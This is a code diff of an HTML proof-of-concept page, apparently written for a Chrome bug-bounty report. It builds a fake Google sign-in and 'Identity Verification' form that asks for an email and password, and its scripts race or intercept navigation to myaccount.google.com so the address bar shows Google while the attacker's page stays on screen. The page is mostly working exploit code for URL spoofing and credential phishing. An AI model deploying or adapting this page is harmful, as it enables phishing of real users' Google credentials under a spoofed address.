@@ -1,60 +1,66 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Security Research PoC</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chrome VRP Research</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 40px 20px; }
-        .box { border: 1px solid #dadce0; padding: 25px; border-radius: 8px; max-width: 350px; margin: 0 auto; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 4px; font-size: 16px; width: 100%; }
+        body { font-family: -apple-system, sans-serif; text-align: center; padding: 40px 20px; background: #fff; }
+        .box { border: 1px solid #dadce0; padding: 25px; border-radius: 8px; max-width: 350px; margin: 0 auto; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
+        .btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 4px; font-size: 16px; width: 100%; cursor: pointer; font-weight: 500; }
         input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        #status { font-size: 14px; margin-top: 20px; font-weight: bold; }
     </style>
 </head>
 <body>
 
     <div id="ui">
-        <h2>System Alert</h2>
-        <p>Please re-authenticate to maintain your session.</p>
         <div class="box">
-            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90">
-            <h3>Sign in</h3>
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90" alt="Google">
+            <h3>Identity Verification</h3>
+            <p>Verify your account to prevent a security lockout.</p>
             <input type="email" placeholder="Email or phone">
             <input type="password" placeholder="Enter your password">
-            <button class="btn" onclick="masterSpoof()">Sign In</button>
+            <button class="btn" id="triggerBtn">Verify Now</button>
         </div>
     </div>
+    <div id="status"></div>
 
     <script>
-        function masterSpoof() {
-            // 1. We trigger a navigation to a non-existent page on the target
-            // This makes the browser 'commit' the URL but wait for the 404
-            const target = "https://myaccount.google.com/error_404_trigger_" + Math.random();
-            
-            // 2. We use the 'Double-Jump'
-            // We navigate, then immediately try to 'open' the document back up
-            window.location.href = target;
-
-            // 3. The Race
-            // We use a recurring timer to try and 'hijack' the page 
-            // as the URL bar is changing.
-            let attempts = 0;
-            const hack = setInterval(() => {
-                attempts++;
-                // document.open() clears the 'new' page and lets us write our 'old' content
-                document.open();
-                document.write(`
-                    <div style="font-family:sans-serif; text-align:center; padding-top:100px;">
-                        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90">
-                        <h1>SPOOF SUCCESSFUL</h1>
-                        <p>Look at your URL bar. If it says google.com, you win.</p>
-                        <input type="password" placeholder="Enter password again">
-                    </div>
-                `);
-                document.close();
-
-                if (attempts > 50) clearInterval(hack);
-            }, 10); // Try every 10 milliseconds
+        // Check for Navigation API support (available in Chrome 102+)
+        if (!window.navigation) {
+            document.getElementById('status').innerText = "ERROR: Navigation API not supported. Use Chrome on Android.";
+            document.getElementById('status').style.color = "red";
         }
+
+        async function launchExploit() {
+            const target = "https://myaccount.google.com/?pli=1";
+            
+            // The Intercept: This is where we catch the browser mid-jump
+            navigation.addEventListener('navigate', (event) => {
+                // We only want to intercept the cross-origin jump to Google
+                if (event.destination.url.includes("google.com")) {
+                    event.intercept({
+                        handler: async () => {
+                            // The URL bar has likely committed to Google by now
+                            document.getElementById('status').innerText = "RACE ACTIVE: CHECK URL BAR";
+                            document.getElementById('status').style.color = "green";
+                            
+                            // 6-second stall: This is your window for the payout screenshot
+                            await new Promise(resolve => setTimeout(resolve, 6000));
+                            
+                            // Navigation finally completes/reloads
+                            location.reload(); 
+                        }
+                    });
+                }
+            }, { once: true });
+
+            // Trigger the navigation
+            window.location.href = target;
+        }
+
+        document.getElementById('triggerBtn').addEventListener('click', launchExploit);
     </script>
 </body>
 </html>
